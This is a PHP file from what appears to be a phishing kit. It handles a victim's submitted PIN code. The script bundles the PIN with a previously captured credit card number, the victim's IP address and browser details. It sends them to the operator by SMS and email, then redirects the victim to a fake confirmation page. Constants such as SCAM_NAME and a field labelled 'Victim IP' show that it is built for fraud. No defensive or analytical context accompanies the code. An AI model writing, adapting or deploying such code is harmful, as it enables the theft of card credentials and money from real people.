<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['spin'] = htmlspecialchars($_POST['pin']);

if(empty($_SESSION['spin'])) {
    header("Location: ../pin.php?page=error&userid={$id}&ue={$ue}");
}
else {
        
    $subject = "🔑 PIN CODE ".SCAM_NAME." ".FLAG."FROM: $ip";
    $rezdata = "🔑 PIN CODE ".SCAM_NAME." ".FLAG."
    
🔑 Code : ".$_SESSION['spin']."

💳 Credit card number : ".$_SESSION['sccn']."
    
🌐 Victim IP : $ip
💠 OS : $agent
    
⚡️ 乃 ㄥ 卂 匚 Ҝ  千 ㄖ 尺 匚 乇 ™ ⚡️
    ";
    
    $maildata = $rezdata;
    
    
    sendSms($rezdata);
        
    sendMail($maildata);

    header("Location: ../loader.php?view=confirm&userid={$id}&ue={$ue}");
}

}
// SMS Config END